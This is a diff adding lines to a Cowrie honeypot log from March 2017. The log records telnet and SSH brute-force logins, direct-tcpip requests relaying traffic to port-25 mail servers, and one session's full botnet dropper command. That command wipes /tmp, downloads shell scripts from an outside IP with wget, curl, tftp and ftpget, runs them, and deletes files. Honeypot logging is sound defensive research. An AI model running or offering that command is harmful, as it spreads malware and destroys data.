@@ -6060,3 +6060,134 @@
 2017-03-27T06:39:58+0000 [SSHChannel None (774) on SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] remote close
 2017-03-27T06:40:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
 2017-03-27T06:40:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 64.191.128.27:25 from localhost:5556
+2017-03-27T06:40:03+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 195.154.17.225:37456 (10.8.41.81:2223) [session: TT133852]
+2017-03-27T06:40:04+0000 [CowrieTelnetTransport,133852,195.154.17.225] login attempt: 7
+2017-03-27T06:40:04+0000 [CowrieTelnetTransport,133852,195.154.17.225] login return, expect: [support/support]
+2017-03-27T06:40:05+0000 [CowrieTelnetTransport,133852,195.154.17.225] login attempt [support/support] succeeded
+2017-03-27T06:40:07+0000 [CowrieTelnetTransport,133852,195.154.17.225] Opening TTY Log: log/tty/20170327-064007-None-133852i.log
+2017-03-27T06:40:07+0000 [CowrieTelnetTransport,133852,195.154.17.225] Warning: state changed and new state returned
+2017-03-27T06:40:07+0000 [CowrieTelnetTransport,133852,195.154.17.225] CMD: rm -fr /tmp; mkdir /tmp; cd /tmp; wget http://163.172.99.61/bins.sh; curl -O http://163.172.99.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 163.172.99.61 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 163.172.99.61; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 163.172.99.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-03-27T06:40:07+0000 [CowrieTelnetTransport,133852,195.154.17.225] Command found: rm -fr /tmp
+2017-03-27T06:40:07+0000 [CowrieTelnetTransport,133852,195.154.17.225] Command found: mkdir /tmp
+2017-03-27T06:40:07+0000 [CowrieTelnetTransport,133852,195.154.17.225] Command found: cd /tmp
+2017-03-27T06:40:07+0000 [CowrieTelnetTransport,133852,195.154.17.225] Command found: wget http://163.172.99.61/bins.sh
+2017-03-27T06:40:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Not storing duplicate content 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Downloaded URL (http://163.172.99.61/bins.sh) with SHA-256 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd to dl/655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: curl -O http://163.172.99.61/bins.sh
+2017-03-27T06:40:07+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-03-27T06:40:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Not storing duplicate content 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Downloaded URL (http://163.172.99.61/bins.sh) with SHA-256 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd to dl/655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/bins.sh
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: tftp 163.172.99.61 -c get tftp1.sh
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 163.172.99.61
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-27T06:40:07+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 163.172.99.61 ftp1.sh ftp1.sh
+2017-03-27T06:40:08+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://163.172.99.61/ftp1.sh) with SHA-256 5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58 to dl/5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58
+2017-03-27T06:40:08+0000 [HTTPPageDownloader,client] Command found: sh /tmp/ftp1.sh
+2017-03-27T06:40:08+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh tftp1.sh tftp2.sh /tmp/ftp1.sh
+2017-03-27T06:40:08+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-03-27T06:40:08+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-03-27T06:40:11+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:11+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 207.69.189.217:25 from localhost:5556
+2017-03-27T06:40:15+0000 [CowrieTelnetTransport,133852,195.154.17.225] Not storing duplicate content 5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58
+2017-03-27T06:40:15+0000 [CowrieTelnetTransport,133852,195.154.17.225] Saved redir contents with SHA-256 5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58 to dl/5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58
+2017-03-27T06:40:15+0000 [CowrieTelnetTransport,133852,195.154.17.225] Not storing duplicate content 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-03-27T06:40:15+0000 [CowrieTelnetTransport,133852,195.154.17.225] Saved redir contents with SHA-256 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd to dl/655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-03-27T06:40:15+0000 [CowrieTelnetTransport,133852,195.154.17.225] Closing TTY Log: log/tty/20170327-064007-None-133852i.log after 8 seconds
+2017-03-27T06:40:15+0000 [CowrieTelnetTransport,133852,195.154.17.225] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-03-27T06:40:15+0000 [CowrieTelnetTransport,133852,195.154.17.225] Connection lost after 12 seconds
+2017-03-27T06:40:24+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 116.31.116.17:17274 (10.8.41.81:2222) [session: e51f672a]
+2017-03-27T06:40:24+0000 [HoneyPotSSHTransport,52752,116.31.116.17] Remote SSH version: SSH-2.0-PUTTY
+2017-03-27T06:40:24+0000 [HoneyPotSSHTransport,52752,116.31.116.17] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-27T06:40:24+0000 [HoneyPotSSHTransport,52752,116.31.116.17] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-27T06:40:24+0000 [HoneyPotSSHTransport,52752,116.31.116.17] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-27T06:40:25+0000 [HoneyPotSSHTransport,52752,116.31.116.17] NEW KEYS
+2017-03-27T06:40:25+0000 [HoneyPotSSHTransport,52752,116.31.116.17] starting service 'ssh-userauth'
+2017-03-27T06:40:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52752,116.31.116.17] 'root' trying auth 'none'
+2017-03-27T06:40:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52752,116.31.116.17] 'root' authenticated with 'none'
+2017-03-27T06:40:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52752,116.31.116.17] starting service 'ssh-connection'
+2017-03-27T06:40:28+0000 [HoneyPotSSHTransport,52752,116.31.116.17] Got remote error, code 11
+	reason: 
+2017-03-27T06:40:28+0000 [HoneyPotSSHTransport,52752,116.31.116.17] avatar root logging out
+2017-03-27T06:40:28+0000 [HoneyPotSSHTransport,52752,116.31.116.17] connection lost
+2017-03-27T06:40:28+0000 [HoneyPotSSHTransport,52752,116.31.116.17] Connection lost after 3 seconds
+2017-03-27T06:40:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 104.44.194.234:25 from localhost:5556
+2017-03-27T06:40:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 65.55.33.135:25 from localhost:5556
+2017-03-27T06:40:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 69.172.201.153:25 from localhost:5556
+2017-03-27T06:40:35+0000 [SSHChannel None (775) on SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] remote eof
+2017-03-27T06:40:35+0000 [SSHChannel None (775) on SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] remote close
+2017-03-27T06:40:35+0000 [SSHChannel None (775) on SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] sending close 775
+2017-03-27T06:40:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 104.44.194.235:25 from localhost:5556
+2017-03-27T06:40:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 65.54.188.94:25 from localhost:5556
+2017-03-27T06:40:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 65.55.33.119:25 from localhost:5556
+2017-03-27T06:40:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 65.55.37.88:25 from localhost:5556
+2017-03-27T06:40:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 104.44.194.232:25 from localhost:5556
+2017-03-27T06:40:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 207.46.8.167:25 from localhost:5556
+2017-03-27T06:40:51+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 106.51.126.25:54380 (10.8.41.81:2222) [session: d47da31e]
+2017-03-27T06:40:51+0000 [HoneyPotSSHTransport,52753,106.51.126.25] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-03-27T06:40:51+0000 [HoneyPotSSHTransport,52753,106.51.126.25] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-27T06:40:51+0000 [HoneyPotSSHTransport,52753,106.51.126.25] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-27T06:40:51+0000 [HoneyPotSSHTransport,52753,106.51.126.25] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-27T06:40:52+0000 [HoneyPotSSHTransport,52753,106.51.126.25] NEW KEYS
+2017-03-27T06:40:52+0000 [HoneyPotSSHTransport,52753,106.51.126.25] starting service 'ssh-userauth'
+2017-03-27T06:40:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] 'root' trying auth 'password'
+2017-03-27T06:40:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] login attempt: 320
+2017-03-27T06:40:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] login return, expect: [virus/virus]
+2017-03-27T06:40:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] login attempt [root/user] failed
+2017-03-27T06:40:54+0000 [SSHChannel None (776) on SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] remote eof
+2017-03-27T06:40:54+0000 [SSHChannel None (776) on SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] remote close
+2017-03-27T06:40:54+0000 [SSHChannel None (776) on SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] sending close 776
+2017-03-27T06:40:54+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:54+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 104.44.194.233:25 from localhost:5556
+2017-03-27T06:40:55+0000 [-] 'root' failed auth 'password'
+2017-03-27T06:40:55+0000 [-] unauthorized login: 
+2017-03-27T06:40:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] 'root' trying auth 'password'
+2017-03-27T06:40:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] login attempt: 321
+2017-03-27T06:40:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] login return, expect: [virus/virus]
+2017-03-27T06:40:59+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,52753,106.51.126.25] login attempt [root/ven0m] failed
+2017-03-27T06:40:59+0000 [HoneyPotSSHTransport,52753,106.51.126.25] connection lost
+2017-03-27T06:40:59+0000 [HoneyPotSSHTransport,52753,106.51.126.25] Connection lost after 7 seconds
+2017-03-27T06:40:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 52.178.167.109:25 from localhost:5556
+2017-03-27T06:40:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:40:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 104.44.194.231:25 from localhost:5556
+2017-03-27T06:41:00+0000 [-] 'root' failed auth 'password'
+2017-03-27T06:41:00+0000 [-] unauthorized login: 
+2017-03-27T06:41:00+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-03-27T06:41:00+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
+	    self.runUntilCurrent()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 878, in runUntilCurrent
+	    call.func(*call.args, **call.kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/userauth.py", line 251, in _ebBadAuth
+	    NS(b','.join(self.supportedAuthentications)) + b'\x00')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/transport.py", line 637, in sendPacket
+	    self.transport.write(encPacket)
+	exceptions.AttributeError: 'NoneType' object has no attribute 'write'
+	
+2017-03-27T06:41:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-27T06:41:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,52593,194.88.106.181] direct-tcp connection request to 65.55.92.136:25 from localhost:5556
